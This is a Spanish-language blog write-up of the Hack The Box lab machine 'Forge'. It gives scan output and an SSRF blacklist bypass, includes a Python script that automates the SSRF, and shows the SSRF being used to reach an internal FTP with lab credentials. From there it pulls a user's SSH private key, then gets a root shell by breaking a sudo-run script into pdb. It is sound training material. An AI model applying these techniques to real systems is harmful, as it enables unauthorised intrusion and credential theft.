<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Forge Writeup [ES] - HackTheBox" /><meta property="og:locale" content="en" /><meta name="description" content="Forge es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la plataforma." /><meta property="og:description" content="Forge es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la plataforma." /><link rel="canonical" href="https://brsalcedom.github.io/Forge-Writeup-HackTheBox/" /><meta property="og:url" content="https://brsalcedom.github.io/Forge-Writeup-HackTheBox/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-22T16:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Forge Writeup [ES] - HackTheBox" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-01-22T16:00:00-03:00","datePublished":"2022-01-22T16:00:00-03:00","description":"Forge es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la plataforma.","headline":"Forge Writeup [ES] - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/Forge-Writeup-HackTheBox/"},"url":"https://brsalcedom.github.io/Forge-Writeup-HackTheBox/"}</script><title>Forge Writeup [ES] - HackTheBox | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Forge Writeup [ES] - HackTheBox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 620 410'%3E%3C/svg%3E" data-src="/images/HTB/Forge/00-banner.png" class="preview-img bg" alt="Preview Image" width="620" height="410" data-proofer-ignore><h1 data-toc-skip>Forge Writeup [ES] - HackTheBox</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1642878000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-01-22 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1456 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p><a href="https://app.hackthebox.com/machines/376">Forge</a> es una máquina <strong>Linux</strong> de dificultad media ofrecida por la plataforma de <a href="https://app.hackthebox.com/">Hack The Box</a>. Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la plataforma.</p><h1 id="resumen">Resumen</h1><p>Forge es una máquina que no consideraría difícil de resolver, es muy intuitiva siempre y cuando se preste atención a las pequeñas pistas. Primero nos encontraremos con un sitio web que permite subir imágenes con dos métodos, desde un archivo local y desde una URL remota. Esta última se puede explotar a través de <strong>SSRF</strong> para acceder a un subdominio que resulta estar bloqueado desde nuestra máquina de atacante. Al consultar este subdominio se nos entrega información adicional para acceder a un FTP junto con sus credenciales, esto nos llevará a descubrir una llave privada SSH para ingresar a Forge con un usuario de bajos privilegios.</p><p>Una vez dentro de la máquina, descubriremos unos permisos especiales que permiten ejecutar un script de python como el usuario <strong>root</strong>. Al cabo de un pequeño análisis del script se detecta una librería inusual que permitirá obtener una consola como <strong>root</strong>.</p><p><img data-src="/images/HTB/Forge/01-info.png" alt="Info" data-proofer-ignore></p><h1 id="enumeración">Enumeración</h1><h2 id="rustscan--nmap"><span class="mr-2">Rustscan / NMAP</span><a href="#rustscan--nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Como siempre, se iniciará realizando un escaneo general de los 65535 puertos.</p><ul><li><code class="language-plaintext highlighter-rouge">rustscan 10.10.11.111 -- -sC -sV | tee services.nmap</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.111:22
Open 10.10.11.111:80

(...)

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>En este caso solo vemos los puertos 22 y 80 abiertos.</p><h2 id="enumeración-web"><span class="mr-2">Enumeración web</span><a href="#enumeración-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Iniciando con <code class="language-plaintext highlighter-rouge">whatweb</code> se detecta que la página web redirecciona hacia el nombre DNS <code class="language-plaintext highlighter-rouge">forge.htb</code>.</p><p><img data-src="/images/HTB/Forge/10-whatweb.png" alt="" data-proofer-ignore></p><p><img data-src="/images/HTB/Forge/15-web-redirect.png" alt="" data-proofer-ignore></p><p>Sabiendo esto, lo agregaremos a <code class="language-plaintext highlighter-rouge">/etc/hosts</code> e intentaremos de nuevo.</p><p>En su index se encuentra una galería de imágenes y un enlace en la esquina superior izquierda etiquetado como <strong>Upload an image</strong>.</p><p><img data-src="/images/HTB/Forge/20-web-homepage.png" alt="" data-proofer-ignore></p><p>Intentamos subir una imagen desde el dispositivo local. Esto inicialmente dió la impresión de que se traba de una vulnerabilidad de tipo <strong>Unrestricted file upload</strong> pero luego de una serie de pruebas se comprobó que no era el caso.</p><p><img data-src="/images/HTB/Forge/22-image-upload.png" alt="" data-proofer-ignore></p><p><img data-src="/images/HTB/Forge/23-image-upload-2.png" alt="" data-proofer-ignore></p><p>El enlace que entrega la web lleva a la ruta donde se almacena dicho archivo, en donde no se puede hacer mucho más.</p><p>Ahora utilizando el método <strong>Upload from url</strong> testearemos como se comporta y si es posible explotarlo. Para esta prueba, levantaremos un servidor web con <code class="language-plaintext highlighter-rouge">php</code> para exponer el archivo <code class="language-plaintext highlighter-rouge">info.php</code> y consultarlo desde <strong>forge.htb</strong></p><p><img data-src="/images/HTB/Forge/25-upload-info.php.png" alt="" data-proofer-ignore></p><p>Al igual que con el otro método, se genera una URL en donde se puede acceder al recurso.</p><p><img data-src="/images/HTB/Forge/28-upload-info.php2.png" alt="" data-proofer-ignore></p><p>Al abrirlo, descubrimos que el archivo existe pero no muestra ningún contenido. Sin embargo, al realizar un <code class="language-plaintext highlighter-rouge">curl</code>, vemos el <code class="language-plaintext highlighter-rouge">phpinfo</code>. Lo interesante de esto es que no se interpreta el código en la máquina Forge, por lo tanto no funcionará como <strong>RFI</strong>, pero si que permite leer la data de una URL dada.</p><p><img data-src="/images/HTB/Forge/30-upload-info.php3.png" alt="" data-proofer-ignore></p><p>Continuando con la enumeración, se intenta aplicar un fuzzing de directorios con <strong>gobuster</strong> el cual no arroja nuevos directorios.</p><p><img data-src="/images/HTB/Forge/35-fuzzing-dir.png" alt="" data-proofer-ignore></p><p>Para el caso de la enumeración de subdominios utilizaremos <code class="language-plaintext highlighter-rouge">wfuzz</code> y esta vez si obtenemos resultados positivos.</p><ul><li><code class="language-plaintext highlighter-rouge">admin.forge.htb</code></ul><p><img data-src="/images/HTB/Forge/38-fuzzing-vhost.png" alt="" data-proofer-ignore></p><p>Lo consultamos y vemos un texto que nos indica que el recurso es accesible solo de manera local.</p><p><img data-src="/images/HTB/Forge/40-admin.forge.htb.png" alt="" data-proofer-ignore></p><h1 id="server-side-request-forgery-ssrf">Server-side request forgery (SSRF)</h1><p>Ahora que sabemos que <code class="language-plaintext highlighter-rouge">admin.forge.htb</code> solo se puede acceder localmente y tenemos una vía potencial de “leer” URL con la herramienta <strong>upload</strong>, intentaremos consultar este recurso y obtener información.</p><p><img data-src="/images/HTB/Forge/45-blacklisted.png" alt="" data-proofer-ignore></p><p>Y la web nos indica que existe una especie de lista negra que no permite consultar el subdominio admin.</p><p>Luego de unos intentos es posible hacer un bypass de la blacklist al ingresar el nombre con mayúsculas.</p><p><img data-src="/images/HTB/Forge/46-bypass.png" alt="" data-proofer-ignore></p><p>Nuevamente, realizamos una petición <strong>GET</strong> a la URL con <code class="language-plaintext highlighter-rouge">curl</code> y vemos información interesante.</p><p><img data-src="/images/HTB/Forge/48-admin-content.png" alt="" data-proofer-ignore></p><p>Se obtienen dos nuevos endpoint:</p><ul><li><code class="language-plaintext highlighter-rouge">admin.forge.htb/announcement</code>.<li><code class="language-plaintext highlighter-rouge">admin.forge.htb/upload</code>.</ul><p>Se realiza una consulta hacia: <code class="language-plaintext highlighter-rouge">admin.forge.htb/announcement</code>.</p><p><img data-src="/images/HTB/Forge/50-announcement.png" alt="" data-proofer-ignore></p><p>Esta página nos indica lo siguiente:</p><ul><li>Existe un ftp interno que se puede acceder con las credenciales: <code class="language-plaintext highlighter-rouge">user:heightofsecurity123!</code>.<li>El endpoint <code class="language-plaintext highlighter-rouge">admin.forge.htb/upload</code> se puede consultar vía GET con el parámetro <code class="language-plaintext highlighter-rouge">u</code> como argumento y es más permisivo que el anterior, ya que permite contenido desde <strong>ftp</strong> y <strong>ftps</strong>.</ul><p>Esto nos da una idea bastante clara de lo que se debe hacer a continuación, pero antes, para facilitar la construcción del SSRF, utilizaré un script en python3 que hará todo el proceso más fácil.</p><p>Este script automatizará la consulta de la URL que se le pase como argumento, obtendrá el enlace que se genera automáticamente y lo consultará para leer su contenido.</p><div file="upload.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="upload.py"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">argparse</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
    <span class="n">description</span><span class="o">=</span><span class="s">"Forge upload script - HTB"</span>
<span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">"url"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Please provide an URL"</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="n">post_url</span> <span class="o">=</span> <span class="s">"http://forge.htb/upload"</span>
<span class="n">post_data</span><span class="o">=</span><span class="p">{</span>
    <span class="s">'url'</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">url</span><span class="p">,</span>
    <span class="s">'remote'</span><span class="p">:</span> <span class="s">"1"</span>
<span class="p">}</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">post_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
<span class="n">link</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">findAll</span><span class="p">(</span><span class="s">"a"</span><span class="p">)[</span><span class="mi">2</span><span class="p">].</span><span class="n">text</span>

<span class="k">print</span><span class="p">(</span><span class="s">"-"</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">link</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"-"</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">link</span><span class="p">))</span>

<span class="n">g</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">link</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">g</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><h1 id="acceso-inicial">Acceso inicial</h1><p>Con toda la información que tenemos, la idea es construir una cadena que haga un <strong>GET</strong> a <code class="language-plaintext highlighter-rouge">admin.forge.htb/upload</code> y le pase como parámetro una string de conexión al <strong>ftp</strong> local.</p><p>Las autenticación al ftp se puede incluir en la misma URL siguiendo esta estructura:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ftp://&lt;username&gt;:&lt;password&gt;@&lt;host&gt;&lt;path&gt;
</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">python3 upload.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/'</code></ul><p><img data-src="/images/HTB/Forge/55-user-home.png" alt="" data-proofer-ignore></p><p>Una vez ejecutado el script con nuestra cadena especialmente diseñada, vemos lo que parece ser el <strong>home</strong> del usuario <code class="language-plaintext highlighter-rouge">user</code>, ya que se encuentra la flag <code class="language-plaintext highlighter-rouge">user.txt</code> dentro de este directorio.</p><p>Sin mucho más explorar dentro de este <strong>ftp</strong>, intenté ingresar por <strong>ssh</strong> con las credenciales obtenidas para recibir el siguiente mensaje: <strong><em>user@forge.htb: Permission denied (publickey)</em></strong>. Esto nos indica que ha sido deshabilitada la autenticación por contraseña para este usuario, por lo tanto, la opción sería ingresar mediante una llave <strong>id_rsa</strong>.</p><p>Volviendo al ftp y considerando que no hay otros directorios de interés que sean visibles, podemos suponer que existe el directorio <code class="language-plaintext highlighter-rouge">.ssh</code> y por ende, una <code class="language-plaintext highlighter-rouge">id_rsa</code> dentro de él.</p><ul><li><code class="language-plaintext highlighter-rouge">python3 upload.py 'http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/.ssh/id_rsa'</code></ul><p><img data-src="/images/HTB/Forge/60-id-rsa.png" alt="" data-proofer-ignore></p><p>Efectivamente existe una llave para la conexión por <strong>ssh</strong> sin proporcionar contraseña.</p><ul><li><code class="language-plaintext highlighter-rouge">ssh -i id_rsa user@forge.htb</code></ul><p><img data-src="/images/HTB/Forge/63-login-as-user.png" alt="" data-proofer-ignore></p><h1 id="escalada-de-privilegios">Escalada de privilegios</h1><p>Una vez dentro, listando los permisos nos encontramos con el script <code class="language-plaintext highlighter-rouge">/opt/remote-manage.py</code> que nuestro usuario puede ejecutar como <strong>root</strong>.</p><p><img data-src="/images/HTB/Forge/65-sudo-l.png" alt="" data-proofer-ignore></p><div file="remote-manage.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="remote-manage.py"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">pdb</span>

<span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
    <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Enter the secret passsword: '</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">().</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s">'secretadminpassword'</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Wrong password!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Welcome admin!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">What do you wanna do: </span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[1] View processes</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[2] View free memory</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[3] View listening sockets</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'[4] Quit</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">())</span>
            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ps aux'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'df'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="p">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s">'ss -lnt'</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
                <span class="n">clientsock</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'Bye</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
                <span class="k">break</span>
<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
    <span class="n">pdb</span><span class="p">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">__traceback__</span><span class="p">)</span>
<span class="k">finally</span><span class="p">:</span>
    <span class="n">quit</span><span class="p">()</span>
</pre></table></code></div></div><p>Por lo que se puede ver en el código, existe una porción en donde posterior a una <strong>excepción</strong>, se gatilla la ejecución de <code class="language-plaintext highlighter-rouge">pdb</code>. Sabiendo que el script se ejecuta como el usuario root, esto se puede explotar para lanzar una consola bajo ese contexto privilegiado.</p><p>Lo primero que haremos será lanzar dos terminales de SSH con el usuario <code class="language-plaintext highlighter-rouge">user</code> y correr el script en una sesión y conectar desde la otra. La contraseña para la conexión puede ser encontrada dentro del código: <code class="language-plaintext highlighter-rouge">secretadminpassword</code>.</p><p><img data-src="/images/HTB/Forge/70-remote-manage-script.png" alt="" data-proofer-ignore></p><p>En este punto ya es posible forzar un error en la ejecución.</p><ol><li>Desde el cliente se envía una respuesta de tipo <code class="language-plaintext highlighter-rouge">string</code>.<li>El server arroja un error ya que se esperaba un <code class="language-plaintext highlighter-rouge">int</code>.<li>Tal como se había visto en el código, posterior a una excepción, se lanza una consola de <code class="language-plaintext highlighter-rouge">pdb</code>.</ol><p><img data-src="/images/HTB/Forge/75-script-exploited.png" alt="" data-proofer-ignore></p><p>Ya solo bastaría lanzar una shell como se haría comunmente en python.</p><ul><li><code class="language-plaintext highlighter-rouge">import os; os.system("/bin/bash")</code></ul><p><img data-src="/images/HTB/Forge/80-root.png" alt="" data-proofer-ignore></p><p>Y eso sería todo para la máquina <a href="https://app.hackthebox.com/machines/376">Forge</a>.</p><blockquote><p>¡Happy Hacking and keep grinding!</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >ssrf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Forge Writeup [ES] - HackTheBox - brsalcedom&amp;url=https://brsalcedom.github.io/Forge-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Forge Writeup [ES] - HackTheBox - brsalcedom&amp;u=https://brsalcedom.github.io/Forge-Writeup-HackTheBox/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brsalcedom.github.io/Forge-Writeup-HackTheBox/&amp;text=Forge Writeup 